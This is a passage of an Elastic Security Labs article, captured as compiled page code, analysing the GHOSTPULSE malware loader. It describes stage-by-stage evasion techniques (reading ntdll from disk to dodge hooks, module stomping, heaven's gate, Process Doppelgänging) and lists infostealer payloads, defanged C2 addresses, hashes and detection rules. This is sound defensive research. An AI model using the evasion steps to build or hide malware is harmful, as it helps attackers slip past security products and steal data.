stomping:\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image4.png\",alt:\"\",width:\"1038\",height:\"318\"})}),`\n`,(0,t.jsx)(e.h3,{id:\"stage-2\",children:\"Stage 2\"}),`\n`,(0,t.jsx)(e.p,{children:`Stage 2 initiates by constructing a new IAT structure and utilizing the CRC32 algorithm as the API name hashing mechanism.\nThe following is the IAT structure of stage 2:`}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-c\",children:`struct core_stage2_IAT\n{\n  void *kernel32_module;\n  void *ntdll_module;\n  void *kernel32_CreateFileW;\n  void *kernel32_WriteFile;\n  void *kernel32_ReadFile;\n  void *kernel32_SetFilePointer;\n  void *kernel32_CloseHandle;\n  void *kernel32_GlobalAlloc;\n  void *kernel32_GlobalFree;\n  void *kernel32_ExpandEnvironmentStringsW;\n  void *kernel32_GetFileSize;\n  void *kernel32_GetProcAddress;\n  void *kernel32_LoadLibraryW;\n  void *ntdll__swprintf;\n  void *kernel32_QueryPerformanceCounter;\n  void *ntdll_RtlDecompressBuffer;\n  void *field_80;\n  void *field_88;\n  void *field_90;\n  void *field_98;\n  void *field_A0;\n  void *ntdll_NtDelayExecution;\n  void *ntdll_RtlRandom;\n  void *kernel32_GetModuleFileNameW;\n  void *kernel32_GetCommandLineW;\n  void *field_C8;\n  void *ntdll_sscanf;\n  void *field_D8;\n  void *ntdll_NtQueryInformationProcess;\n  void *ntdll_NtQuerySystemInformation;\n  void *kernel32_CreateDirectoryW;\n  void *kernel32_CopyFileW;\n  void *ntdll_NtClose;\n  void *field_108;\n  void *field_110;\n  void *field_118;\n  void *field_120;\n  void *field_128;\n  void *kernel32_SetCurrentDirectoryW;\n  void *field_138;\n  void *kernel32_SetEnvironmentVariableW;\n  void *kernel32_CreateProcessW;\n  void *kernel32_GetFileAttributesW;\n  void *msvcrt_malloc;\n  void *msvcrt_realloc;\n  void *msvcrt_free;\n  void *ntdll_RtlHashUnicodeString;\n  void *field_178;\n  void *field_180;\n  void *kernel32_OpenMutexA;\n  void *field_190;\n  void *kernel32_VirtualProtect;\n  void *kernel32_FlushInstructionCache;\n  void *field_1A8;\n  void *ntdll_NtOpenProcessToken;\n  void *ntdll_NtQueryInformationToken;\n  void *ntdll_RtlWalkFrameChain;\n  void *field_1C8;\n  void *addr_temp_file_content;\n  void *addr_decrypted_file;\n};\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Concerning NT functions, the malware reads the ntdll.dll library from disk and writes it to a dynamically allocated memory space with read, write, and execute permissions. Subsequently, it parses the loaded \",(0,t.jsx)(e.code,{children:\"ntdll.dll\"}),\" library to extract the offsets of the required NT functions. These offsets are then stored within the newly built IAT structure. When the malware necessitates the execution of an NT API, it adds the API offset to the base address of \",(0,t.jsx)(e.code,{children:\"ntdll.dll\"}),\" and directly invokes the API. Given that NT APIs operate at a very low level, they execute syscalls directly, which does not require the \",(0,t.jsx)(e.code,{children:\"ntdll.dll\"}),\" library to be loaded in memory using the LoadLibrary API, this is done to evade userland hooks set by security products.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"The following is the structure used by the malware to store NT API offsets:\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-c\",children:`struct __unaligned __declspec(align(4)) core_stage2_nt_offsets_table\n{\n  __int64 ntdll_module;\n  int ZwCreateSection;\n  int ZwMapViewOfSection;\n  int ZwWriteVirtualMemory;\n  int ZwProtectVirtualMemory;\n  int NtSuspendThread;\n  int ZwResumeThread;\n  int ZwOpenProcess;\n  int ZwGetContextThread;\n  int NtSetContextThread;\n};\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"GHOSTPULSE has the ability to establish persistence, if configured to, by generating an \",(0,t.jsx)(e.code,{children:\".lnk\"}),\" file that points to the Stage 1 binary, denoted as \",(0,t.jsx)(e.code,{children:\"VBoxSVC.exe\"}),\". To achieve this, the malware leverages COM (Component Object Model) objects as part of its technique.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image6.png\",alt:\"Persistence executed according to the configuration flag\",width:\"1067\",height:\"83\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"It extracts another sub-blob of data from the first decrypted blob of Stage 1. This data is located at a specific position in the structure. The malware then performs an XOR encryption on this sub-blob, using the result of the XOR operation between the CRC32 value of the machine's computer name and the constant value \",(0,t.jsx)(e.code,{children:\"0xA1B2D3B4\"}),`. Finally, the encrypted data is saved to a file in the user's temporary folder.\nIt extracts another sub-blob of data from the first decrypted blob of Stage 1. This data is located at a specific position in the structure. The malware then performs an XOR encryption on this sub-blob, using the result of the XOR operation between the CRC32 value of the machine's computer name and the constant value `,(0,t.jsx)(e.code,{children:\"0xA1B2D3B4\"}),\". Finally, the encrypted data is saved to a file in the user's temporary folder.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"The malware then initiates a suspended child process using the executable specified in the Stage 2 configuration, which is a 32-bit \",(0,t.jsx)(e.code,{children:\"cmd.exe\"}),\" in this case. It then adds an environment variable to the child process with a random name, example: \",(0,t.jsx)(e.code,{children:\"GFHZNIOWWLVYTESHRTGAVC\"}),\", pointing to the previously created temporary file.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Further, the malware proceeds by creating a section object and mapping a view of it to \",(0,t.jsx)(e.code,{children:\"mshtml.dll\"}),\" in the child process using the \",(0,t.jsx)(e.code,{children:\"ZwCreateSection\"}),\" and \",(0,t.jsx)(e.code,{children:\"ZwMapViewOfSection\"}),\" APIs.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"The legitimate \",(0,t.jsx)(e.code,{children:\"mshtml.dll\"}),\" code is overwritten with the \",(0,t.jsx)(e.em,{children:\"WriteProcessMemory\"}),\" API. The primary thread\\u2019s execution is then redirected to the malicious code in \",(0,t.jsx)(e.code,{children:\"mshtml.dll\"}),\" with the \",(0,t.jsx)(e.em,{children:\"Wow64SetThreadContext\"}),\" API as shown in the following image:\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image12.png\",alt:\"\",width:\"1071\",height:\"228\"})}),`\n`,(0,t.jsx)(e.p,{children:\"The parent process promptly terminates itself.\"}),`\n`,(0,t.jsx)(e.h3,{id:\"stage-3\",children:\"Stage 3\"}),`\n`,(0,t.jsxs)(e.p,{children:['The objective of GHOSTPULSE\\u2019s Stage 3 is to load and execute the final payload in another  process. One interesting part of Stage 3 was that it overwrites its previously executed instructions with new instructions to make analysis difficult. It is also capable of establishing persistence using the same method described above. GHOSTPULSE executes NTDLL APIs using the \"',(0,t.jsx)(e.a,{href:\"https://www.zdnet.com/article/malware-authors-are-still-abusing-the-heavens-gate-technique/\",rel:\"nofollow\",children:\"heaven\\u2019s gate\"}),'\" technique.']}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image9.png\",alt:\"\",width:\"624\",height:\"200\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Stage 3 starts off by constructing its own Function Import Table using CRC32 as the hashing algorithm. Additionally, it has the capability to disable redirection of the file system to WOW64, achieved through the utilization of the procedure \",(0,t.jsx)(e.code,{children:\"Wow64FsRedirection\"}),\", if configured to do so.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Following this, Stage 3 accesses the environment variable that was set earlier, in our case \",(0,t.jsx)(e.code,{children:\"GFHZNIOWWLVYTESHRTGAVC\"}),\", retrieves the associated temporary file and proceeds to decrypt its contents.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image15.png\",alt:\"Decrypting the temp file using the computer name and a hardcoded value\",width:\"932\",height:\"274\"})}),`\n`,(0,t.jsx)(e.p,{children:\"The decrypted file includes both a configuration and the ultimate payload in an encrypted format. The final payload undergoes XOR decryption using a 200-byte long key stored within the configuration. The malware then parses the PE structure of the payload with a set of functions that will indicate how the payload will be injected, for example, the type of payload (DLL or executable) architecture, etc.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image3.png\",alt:\"Decrypting the final payload\",width:\"1215\",height:\"757\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"GHOSTPULSE employs \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack\",rel:\"nofollow\",children:\"Process Doppelg\\xE4nging\"}),\", leveraging the NTFS transactions feature to inject the final payload into a new child process. The following steps illustrate the process:\"]}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsxs)(e.li,{children:[\"Calls the \",(0,t.jsx)(e.code,{children:\"CreateTransaction\"}),\" API to initial a transaction\"]}),`\n`,(0,t.jsxs)(e.li,{children:[\"Creates a transaction file with a random file name in temp folder with the \",(0,t.jsx)(e.code,{children:\"ZwCreateFile\"}),\" API\"]}),`\n`,(0,t.jsxs)(e.li,{children:[\"Writes the payload to the temp file using the \",(0,t.jsx)(e.code,{children:\"ZwWriteFile\"}),\" API\"]}),`\n`,(0,t.jsxs)(e.li,{children:[\"Creates a section of the transaction file with \",(0,t.jsx)(e.code,{children:\"ZwCreateSection\"}),\" API\"]}),`\n`,(0,t.jsxs)(e.li,{children:[\"At this point the file is not needed anymore, the malware calls the \",(0,t.jsx)(e.code,{children:\"RollbackTransaction\"}),\" API to roll the transaction back\"]}),`\n`,(0,t.jsxs)(e.li,{children:[\"GHOSTPULSE creates a suspended process with the target process path taken from it's configuration, in our sample \",(0,t.jsx)(e.code,{children:\"1msbuild.exe1\"})]}),`\n`,(0,t.jsxs)(e.li,{children:[\"It maps a view of the section to the process with the \",(0,t.jsx)(e.code,{children:\"ZwMapViewOfSection\"}),\" API\"]}),`\n`,(0,t.jsxs)(e.li,{children:[\"It sets the child process thread instruction pointer to the entry point of the final payload with the \",(0,t.jsx)(e.code,{children:\"NtSetContextThread\"}),\" API\"]}),`\n`,(0,t.jsxs)(e.li,{children:[\"Finally it resumes the thread with the \",(0,t.jsx)(e.code,{children:\"NtResumeThread\"}),\" API\"]}),`\n`]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image8.png\",alt:\"Functions used to execute process doppelg\\xE4nging technique\",width:\"1011\",height:\"250\"})}),`\n`,(0,t.jsx)(e.h3,{id:\"final-payload\",children:\"Final Payload\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"The final payload varies from sample to sample but is typically an information stealer. We have observed SectopRAT, Rhadamanthys, Vidar, Lumma, and NetSupport as final payloads. In SectopRAT samples, the malware first reaches out to Pastebin to retrieve the command and control address. In this case, it was \",(0,t.jsx)(e.code,{children:\"195.201.198[.]179\"}),\" over TCP port \",(0,t.jsx)(e.code,{children:\"15647\"}),\" as shown below:\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image7.jpg\",alt:\"\",width:\"360\",height:\"112\"})}),`\n`,(0,t.jsx)(e.h2,{id:\"configuration-extractor\",children:\"Configuration extractor\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Alongside this research, the Elastic Security Research Team has provided a \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/labs-releases/blob/main/tools/ghostpulse/ghostpulse_payload_extractor.py\",rel:\"nofollow\",children:\"configuration extractor\"}),\" to allow threat researchers to continue work to discover further developments within this campaign and expand detection capabilities for our community. The extractor takes the encrypted file shipped with GHOSTPULSE as the input.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/image16.png\",alt:\"\",width:\"1440\",height:\"787\"})}),`\n`,(0,t.jsx)(e.h2,{id:\"detection-guidance\",children:\"Detection Guidance\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Elastic Defend detects this threat with the following \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/tree/main/behavior\",rel:\"nofollow\",children:\"behavior protection rules\"}),\":\"]}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsx)(e.li,{children:\"DNS Query to Suspicious Top Level Domain\"}),`\n`,(0,t.jsx)(e.li,{children:\"Library Load of a File Written by a Signed Binary Proxy\"}),`\n`,(0,t.jsx)(e.li,{children:\"Suspicious API Call from an Unsigned DLL\"}),`\n`,(0,t.jsx)(e.li,{children:\"Suspicious Memory Write to a Remote Process\"}),`\n`,(0,t.jsx)(e.li,{children:\"Process Creation from Modified NTDLL\"}),`\n`]}),`\n`,(0,t.jsx)(e.p,{children:\"The following yara rule will also detect GHOSTPULSE loaders on disk:\"}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_GhostPulse.yar\",rel:\"nofollow\",children:\"Windows.Trojan.GhostPulse\"})}),`\n`]}),`\n`,(0,t.jsx)(e.h2,{id:\"observations\",children:\"Observations\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"All observables are also available for \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/labs-releases/tree/main/indicators/ghostpulse\",rel:\"nofollow\",children:\"download\"}),\" in both ECS and STIX format.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"The following observables were discussed in this research.\"}),`\n`,(0,t.jsx)(e.div,{className:\"table-container\",children:(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{children:\"Observable\"}),(0,t.jsx)(e.th,{children:\"Type\"}),(0,t.jsx)(e.th,{children:\"Name\"}),(0,t.jsx)(e.th,{children:\"Reference\"})]})}),(0,t.jsxs)(e.tbody,{children:[(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"78.24.180[.]93\"}),(0,t.jsx)(e.td,{children:\"ip-v4\"}),(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:\"Stage 0 C2 IP\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"manojsinghnegi[.]com\"}),(0,t.jsx)(e.td,{children:\"domain-name\"}),(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:\"Stage 0 C2 domain\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"manojsinghnegi[.]com/2.tar.gpg\"}),(0,t.jsx)(e.td,{children:\"url\"}),(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:\"Stage 0 C2 URL\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"0c01324555494c35c6bbd8babd09527bfc49a2599946f3540bb3380d7bec7a20\"}),(0,t.jsx)(e.td,{children:\"sha256\"}),(0,t.jsx)(e.td,{children:\"Chrome-x64.msix\"}),(0,t.jsx)(e.td,{children:\"Malicious MSIX\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"ee4c788dd4a173241b60d4830db128206dcfb68e79c68796627c6d6355c1d1b8\"}),(0,t.jsx)(e.td,{children:\"sha256\"}),(0,t.jsx)(e.td,{children:\"Brave-x64.msix\"}),(0,t.jsx)(e.td,{children:\"Malicious MSIX\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"4283563324c083f243cf9335662ecc9f1ae102d619302c79095240f969d9d356\"}),(0,t.jsx)(e.td,{children:\"sha256\"}),(0,t.jsx)(e.td,{children:\"Webex.msix\"}),(0,t.jsx)(e.td,{children:\"Malicious MSIX\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"eb2addefd7538cbd6c8eb42b70cafe82ff2a8210e885537cd94d410937681c61\"}),(0,t.jsx)(e.td,{children:\"sha256\"}),(0,t.jsx)(e.td,{children:\"new1109.ps1\"}),(0,t.jsx)(e.td,{children:\"PowerShell Downloader\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"49e6a11453786ef9e396a9b84aeb8632f395477abc38f1862e44427982e8c7a9\"}),(0,t.jsx)(e.td,{children:\"sha256\"}),(0,t.jsx)(e.td,{children:\"38190626900.rar\"}),(0,t.jsx)(e.td,{children:\"GHOSTPULSE tar archive\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Futurity Designs Ltd\"}),(0,t.jsx)(e.td,{children:\"Code signer\"}),(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:\"Chrome-x64.msix code signer\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Fodere Titanium Limited\"}),(0,t.jsx)(e.td,{children:\"Code signer\"}),(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:\"Brave-x64.msix code signer\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"IMPERIOUS TECHNOLOGIES LIMITED\"}),(0,t.jsx)(e.td,{children:\"Code signer\"}),(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:\"Webex.msix code signer\"})]})]})]})}),`\n`,(0,t.jsx)(e.h2,{id:\"references\",children:\"References\"}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.a,{href:\"https://twitter.com/1ZRR4H/status/1699923793077055821\",rel:\"nofollow\",children:\"https://twitter.com/1ZRR4H/status/1699923793077055821\"})}),`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.a,{href:\"https://www.rapid7.com/blog/post/2023/08/31/fake-update-utilizes-new-idat-loader-to-execute-stealc-and-lumma-infostealers/\",rel:\"nofollow\",children:\"https://www.rapid7.com/blog/post/2023/08/31/fake-update-utilizes-new-idat-loader-to-execute-stealc-and-lumma-infostealers/\"})}),`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.a,{href:\"https://www.proofpoint.com/us/blog/threat-insight/are-you-sure-your-browser-date-current-landscape-fake-browser-updates\",rel:\"nofollow\",children:\"https://www.proofpoint.com/us/blog/threat-insight/are-you-sure-your-browser-date-current-landscape-fake-browser-updates\"})}),`\n`]})]})}function _(i={}){let{wrapper:e}=i.components||{};return e?(0,t.jsx)(e,Object.assign({},i,{children:(0,t.jsx)(c,i)})):c(i)}var k=_;return v(S);})();\n;return Component;"},"_id":"articles/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks.mdx","_raw":{"sourceFilePath":"articles/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks.mdx","sourceFileName":"ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks.mdx","sourceFileDir":"articles","contentType":"mdx","flattenedPath":"articles/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks"},"type":"Article","imageUrl":"/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/photo-edited-05@2x.jpg","readingTime":"17 min read","series":"","url":"/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks","headings":[{"level":2,"title":"Update","href":"#update"},{"level":2,"title":"Preamble","href":"#preamble"},{"level":2,"title":"Malware Analysis","href":"#malware-analysis"},{"level":3,"title":"Stage 0","href":"#stage-0"},{"level":3,"title":"Stage 1","href":"#stage-1"},{"level":3,"title":"Stage 2","href":"#stage-2"},{"level":3,"title":"Stage 3","href":"#stage-3"},{"level":3,"title":"Final Payload","href":"#final-payload"},{"level":2,"title":"Configuration extractor","href":"#configuration-extractor"},{"level":2,"title":"Detection Guidance","href":"#detection-guidance"},{"level":2,"title":"Observations","href":"#observations"},{"level":2,"title":"References","href":"#references"}],"author":[{"title":"Salim Bitam","slug":"salim-bitam","description":"Elastic","body":{"raw":"","code":"var Component=(()=\u003e{var l=Object.create;var i=Object.defineProperty;var x=Object.getOwnPropertyDescriptor;var f=Object.getOwnPropertyNames;var _=Object.getPrototypeOf,d=Object.prototype.hasOwnProperty;var g=(t,n)=\u003e()=\u003e(n||t((n={exports:{}}).exports,n),n.exports),j=(t,n)=\u003e{for(var e in n)i(t,e,{get:n[e],enumerable:!0})},s=(t,n,e,o)=\u003e{if(n\u0026\u0026typeof n==\"object\"||typeof n==\"function\")for(let a of f(n))!d.call(t,a)\u0026\u0026a!==e\u0026\u0026i(t,a,{get:()=\u003en[a],enumerable:!(o=x(n,a))||o.enumerable});return t};var p=(t,n,e)=\u003e(e=t!=null?l(_(t)):{},s(n||!t||!t.__esModule?i(e,\"default\",{value:t,enumerable:!0}):e,t)),M=t=\u003es(i({},\"__esModule\",{value:!0}),t);var c=g((h,m)=\u003e{m.exports=_jsx_runtime});var F={};j(F,{default:()=\u003eD,frontmatter:()=\u003eb});var r=p(c()),b={title:\"Salim Bitam\",description:\"Elastic\",slug:\"salim-bitam\"};function u(t){return(0,r.jsx)(r.Fragment,{})}function C(t={}){let{wrapper:n}=t.components||{};return n?(0,r.jsx)(n,Object.assign({},t,{children:(0,r.jsx)(u,t)})):u(t)}var D=C;return M(F);})();\n;return Component;"},"_id":"authors/salim-bitam.mdx","_raw":{"sourceFilePath":"authors/salim-bitam.mdx","sourceFileName":"salim-bitam.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/salim-bitam"},"type":"Author","imageUrl":"","url":"/authors/salim-bitam"},{"title":"Joe Desimone","slug":"joe-desimone","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var s=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var j=Object.getOwnPropertyNames;var _=Object.getPrototypeOf,d=Object.prototype.hasOwnProperty;var g=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),l=(t,e)=\u003e{for(var n in e)s(t,n,{get:e[n],enumerable:!0})},i=(t,e,n,a)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let r of j(e))!d.call(t,r)\u0026\u0026r!==n\u0026\u0026s(t,r,{get:()=\u003ee[r],enumerable:!(a=f(e,r))||a.enumerable});return t};var p=(t,e,n)=\u003e(n=t!=null?x(_(t)):{},i(e||!t||!t.__esModule?s(n,\"default\",{value:t,enumerable:!0}):n,t)),D=t=\u003ei(s({},\"__esModule\",{value:!0}),t);var c=g((h,m)=\u003e{m.exports=_jsx_runtime});var X={};l(X,{default:()=\u003eF,frontmatter:()=\u003eM});var o=p(c()),M={title:\"Joe Desimone\",slug:\"joe-desimone\"};function u(t){return(0,o.jsx)(o.Fragment,{})}function C(t={}){let{wrapper:e}=t.components||{};return e?(0,o.jsx)(e,Object.assign({},t,{children:(0,o.jsx)(u,t)})):u(t)}var F=C;return D(X);})();\n;return Component;"},"_id":"authors/joe-desimone.mdx","_raw":{"sourceFilePath":"authors/joe-desimone.mdx","sourceFileName":"joe-desimone.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/joe-desimone"},"type":"Author","imageUrl":"","url":"/authors/joe-desimone"}],"category":[{"title":"Attack pattern","slug":"attack-pattern","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var o=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var _=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,n)=\u003e()=\u003e(n||t((n={exports:{}}).exports,n),n.exports),l=(t,n)=\u003e{for(var e in n)o(t,e,{get:n[e],enumerable:!0})},s=(t,n,e,c)=\u003e{if(n\u0026\u0026typeof n==\"object\"||typeof n==\"function\")for(let a of p(n))!g.call(t,a)\u0026\u0026a!==e\u0026\u0026o(t,a,{get:()=\u003en[a],enumerable:!(c=f(n,a))||c.enumerable});return t};var d=(t,n,e)=\u003e(e=t!=null?x(_(t)):{},s(n||!t||!t.__esModule?o(e,\"default\",{value:t,enumerable:!0}):e,t)),M=t=\u003es(o({},\"__esModule\",{value:!0}),t);var i=j((b,u)=\u003e{u.exports=_jsx_runtime});var F={};l(F,{default:()=\u003eD,frontmatter:()=\u003ek});var r=d(i()),k={title:\"Attack pattern\",slug:\"attack-pattern\"};function m(t){return(0,r.jsx)(r.Fragment,{})}function C(t={}){let{wrapper:n}=t.components||{};return n?(0,r.jsx)(n,Object.assign({},t,{children:(0,r.jsx)(m,t)})):m(t)}var D=C;return M(F);})();\n;return Component;"},"_id":"categories/attack-pattern.mdx","_raw":{"sourceFilePath":"categories/attack-pattern.mdx","sourceFileName":"attack-pattern.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/attack-pattern"},"type":"Category","url":"/categories/attack-pattern"},{"title":"Malware analysis","slug":"malware-analysis","body":{"raw":"","code":"var Component=(()=\u003e{var u=Object.create;var s=Object.defineProperty;var x=Object.getOwnPropertyDescriptor;var f=Object.getOwnPropertyNames;var _=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,n)=\u003e()=\u003e(n||t((n={exports:{}}).exports,n),n.exports),M=(t,n)=\u003e{for(var e in n)s(t,e,{get:n[e],enumerable:!0})},i=(t,n,e,o)=\u003e{if(n\u0026\u0026typeof n==\"object\"||typeof n==\"function\")for(let r of f(n))!g.call(t,r)\u0026\u0026r!==e\u0026\u0026s(t,r,{get:()=\u003en[r],enumerable:!(o=x(n,r))||o.enumerable});return t};var d=(t,n,e)=\u003e(e=t!=null?u(_(t)):{},i(n||!t||!t.__esModule?s(e,\"default\",{value:t,enumerable:!0}):e,t)),p=t=\u003ei(s({},\"__esModule\",{value:!0}),t);var l=j((X,c)=\u003e{c.exports=_jsx_runtime});var D={};M(D,{default:()=\u003eC,frontmatter:()=\u003ew});var a=d(l()),w={title:\"Malware analysis\",slug:\"malware-analysis\"};function m(t){return(0,a.jsx)(a.Fragment,{})}function y(t={}){let{wrapper:n}=t.components||{};return n?(0,a.jsx)(n,Object.assign({},t,{children:(0,a.jsx)(m,t)})):m(t)}var C=y;return p(D);})();\n;return Component;"},"_id":"categories/malware-analysis.mdx","_raw":{"sourceFilePath":"categories/malware-analysis.mdx","sourceFileName":"malware-analysis.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/malware-analysis"},"type":"Category","url":"/categories/malware-analysis"}]},"seriesArticles":null},"__N_SSG":true},"page":"/[slug]","query":{"slug":"ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks"},"buildId":"dGrrQfBbQkqaleQ_11aBK","assetPrefix":"/security-labs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>